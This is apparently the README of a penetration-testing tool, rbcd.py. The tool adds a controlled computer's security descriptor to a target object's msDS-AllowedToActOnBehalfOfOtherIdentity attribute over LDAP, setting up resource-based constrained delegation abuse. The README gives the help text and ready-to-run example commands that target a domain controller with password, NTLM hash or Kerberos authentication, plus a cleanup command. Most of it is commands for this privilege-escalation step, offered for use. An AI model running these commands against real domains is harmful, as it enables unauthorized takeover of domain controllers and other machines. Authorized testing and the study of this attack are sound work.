# rbcd_permissions
Add SD for controlled computer object to a target object for RBCD using LDAP
```
optional arguments:
  -h, --help            show this help message and exit
  -u USERNAME, --username USERNAME
                        username for LDAP
  -p PASSWORD, --password PASSWORD
                        password for LDAP
  -H HASH, --hash HASH  LM:NT hash for LDAP
  -k, --kerberos        Kerberos Auth GSSAPI
  -d DOMAIN, --domain DOMAIN
                        LDAP server/domain
  -t TARGETDN, --targetDn TARGETDN
                        Target distinguishedName (Example: "CN=DC1,OU=Domain Controllers,DC=lab,DC=local")
  -c CONTRDN, --contrDn CONTRDN
                        Controlled computer distingushedName to add to msDS-AllowedToActOnBehalfOfOtherIdentity attribute
  -l LDAPSERVER, --ldapserver LDAPSERVER
                        LDAP server, in case it cant resolve
  --cleanup             Delete msDS-AllowedToActOnBehalfOfOtherIdentity value
```

Supports NTLM hash, kerberos and password auth.

## Password
```
python3 rbcd.py -t 'CN=DC1,OU=Domain Controllers,DC=lab,DC=local' -d lab.local -c CN=Server1,CN=Computers,DC=lab,DC=local -u administrator -p Password1 -l dc1.lab.local
Successfully added permissions!
```

## Kerberos
```
python3 rbcd.py -t 'CN=DC1,OU=Domain Controllers,DC=lab,DC=local' -d lab.local -c CN=Server1,CN=Computers,DC=lab,DC=local -k -l dc1.lab.local
Successfully added permissions!
```

## Cleanup
```
python3 rbcd.py -t 'CN=DC1,OU=Domain Controllers,DC=lab,DC=local' -d lab.local -c CN=Server1,CN=Computers,DC=lab,DC=local -u administrator -p Password1 -l dc1.lab.local --cleanup
Successfully cleaned up!
```
